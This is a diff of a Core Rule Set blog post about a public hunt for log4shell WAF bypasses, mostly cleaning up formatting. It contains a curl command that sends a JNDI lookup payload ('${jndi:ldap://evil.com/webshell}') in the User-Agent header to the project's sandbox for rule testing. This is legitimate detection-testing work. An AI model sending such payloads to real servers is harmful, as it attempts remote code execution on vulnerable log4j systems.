@@ -3,7 +3,6 @@ author: dune73
 categories:
   - Blog
 date: '2021-12-16T13:01:59+01:00'
-guid: https://coreruleset.org/?p=1564
 permalink: /20211216/public-hunt-for-log4j-log4shell-evasions-waf-bypasses/
 title: Public Hunt for log4j / log4shell Evasions / WAF Bypasses
 url: /2021/12/16/public-hunt-for-log4j-log4shell-evasions-waf-bypasses/
@@ -19,7 +18,7 @@ We have now combined the [](https://coreruleset.org/20211209/introducing-the-crs
 #### How test my bypass?
 
 ```
-<pre class="wp-block-preformatted">$ curl -H 'x-crs-version: 3.4.0-dev-log4j' -H 'x-format-output: txt-matched-rules' -H 'User-Agent: ${jndi:ldap://evil.com/webshell}' https://sandbox.coreruleset.org/
+$ curl -H 'x-crs-version: 3.4.0-dev-log4j' -H 'x-format-output: txt-matched-rules' -H 'User-Agent: ${jndi:ldap://evil.com/webshell}' https://sandbox.coreruleset.org/
 ```
 
 The important bit is the custom HTTP header `x-crs-version: 3.4.0-dev-log4j`:[ ](<x-crs-version: 3.4.0-dev-log4j>)With this version string you get onto our new instance that carries the latest versions of the log4j attack detection. The other instances are vanilla CRS tags. They won't get the new rules / capabilities until we do a new release (and given we're usually not add new rules to existing stable releases in order to avoid introducing new false positives, this won't be anytime soon).
